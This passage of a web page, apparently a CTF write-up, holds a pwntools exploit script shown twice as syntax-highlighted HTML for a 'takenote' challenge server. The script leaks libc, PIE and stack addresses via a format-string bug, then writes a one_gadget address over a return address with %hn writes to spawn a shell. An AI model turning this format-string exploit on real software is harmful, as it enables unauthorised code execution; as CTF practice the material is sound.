style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">?</span><span style="color:#A65E2B">\n\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">e?</span><span style="color:#A65E2B">\n\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">%p.%14$p,%15$p</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">reads:</span><span style="color:#A65E2B">\n\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    libc_base </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">.</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1ed723</span><br><span style="color:#393A34">    pie </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">,</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">15b0</span><br><span style="color:#393A34">    stack_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">pie => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000000160b</span><br><span style="color:#393A34">    binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ogg </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">e3b01</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"ogg => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">ogg</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"%30576c%14$hnaaa"</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"%</span><span style="color:#1e754f">{</span><span style="color:#393A34">ogg </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffff</span><span style="color:#1e754f">}</span><span style="color:#B56959">c%19$hn"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%30578c</span><span style="color:#B56959">%14$hnaaa</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"%</span><span style="color:#1e754f">{</span><span style="color:#a65e2b">(</span><span style="color:#393A34">ogg </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 16</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffff</span><span style="color:#1e754f">}</span><span style="color:#B56959">c%19$hn"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%30580c</span><span style="color:#B56959">%14$hnaaa</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#999999">,</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"%</span><span style="color:#1e754f">{</span><span style="color:#a65e2b">(</span><span style="color:#393A34">ogg </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#1e754f">}</span><span style="color:#B56959">c%19$hhn"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%30581c</span><span style="color:#B56959">%14$hnaaa</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"%</span><span style="color:#1e754f">{</span><span style="color:#a65e2b">(</span><span style="color:#393A34">ogg </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 40</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">c%19$hhn"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">takenote.kctf-453514-codelab.kctf.cloud</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1337</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    except</span><span style="color:#999999">:</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./chal_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">breakrva 0x14d8</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Exit</span><span style="color:#C99076">\n\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">]</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">?</span><span style="color:#C99076">\n\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">e?</span><span style="color:#C99076">\n\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">%p.%14$p,%15$p</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">reads:</span><span style="color:#C99076">\n\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    libc_base </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1ed723</span><br><span style="color:#DBD7CAEE">    pie </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">,</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">15b0</span><br><span style="color:#DBD7CAEE">    stack_addr </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">pie => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">pie</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000000160b</span><br><span style="color:#DBD7CAEE">    binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ogg </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">e3b01</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"ogg => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">ogg</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"%30576c%14$hnaaa"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"%</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ogg </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffff</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">c%19$hn"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span 